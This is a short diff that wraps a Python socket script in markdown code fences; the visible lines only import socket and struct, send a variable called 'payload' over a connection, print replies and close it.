@@ -1,3 +1,4 @@
+```
 import socket
 import struct
 
@@ -15,3 +16,4 @@ print(conn.recv(1024).decode())
 conn.sendall(payload + b"\n")
 print(conn.recv(1024).decode())
 conn.close()
+```
